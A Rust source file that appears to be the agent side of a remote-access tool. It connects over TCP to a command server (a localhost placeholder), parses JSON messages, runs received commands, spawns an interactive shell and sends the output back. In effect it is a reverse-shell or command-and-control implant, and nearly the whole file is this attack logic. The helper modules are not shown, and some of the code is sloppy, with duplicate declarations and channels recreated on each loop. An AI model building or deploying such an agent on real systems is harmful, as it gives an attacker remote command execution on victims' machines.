use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt,AsyncWriteExt};
use tokio::process::Command;
use std::process::Stdio;
use serde_json::Result;
use tokio::{io::*, process::*, sync::*, *};
mod comm;
mod funcs;


#[tokio::main]
async fn main() {
    // Buff for socket
    let mut buff = [0;1024];
    // Tokio create connection
    let mut stream: tokio::net::TcpStream = TcpStream::connect("127.0.0.1:8080").await.unwrap();
    let mut ActiveShell: bool = false;
    let (tx, mut rx) = mpsc::channel::<comm::MyProto>(32);
    
    let mut ActiveShell: bool = false;
    //let mut shellin: Option<tokio::process::ChildStdin> = None;
    // Keep accepting data and do st                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           uff with is
    loop{
        
        let mut shellin: Option<tokio::process::ChildStdin> = None;
        let n: usize = stream.read(&mut buff).await.unwrap();
        let (tx, mut rx) = mpsc::channel::<comm::MyProto>(32);
        // Convert JSON to struct
        let my_data: comm::MyProto = serde_json::from_str(std::str::from_utf8( &mut buff[..n]).unwrap()).unwrap();
        
        match my_data.message_type.as_str() { 

            // Message type is command so run the command
            "command" => {
                funcs::run_command(my_data, tx).await;
   
            },

            "shell" => {
                let (shelltx, mut shellrx) = mpsc::channel::<String>(32);
                let command = my_data.data.clone();
                
               if ActiveShell == false{
                   ActiveShell = true;
                   funcs::spawn_shell(my_data, tx, shellrx).await;
               }
               shelltx.send(command).await;
        },      
            _ => {
                let output_data: comm::MyProto = comm::MyProto{
                data: "Error: Unknown message_type".to_string(),
                message_type: "Error".to_string(),
                channel: "1".to_string()}; 
                tx.send(output_data).await;
        
                }
            };

                let message = rx.recv().await.unwrap();
                
                match message.data.as_str() {
                    "" => {},
                    _ => {
                        stream.write(serde_json::to_string(&message).unwrap().as_bytes()).await.unwrap();
                    }
                }
                
            
        }
}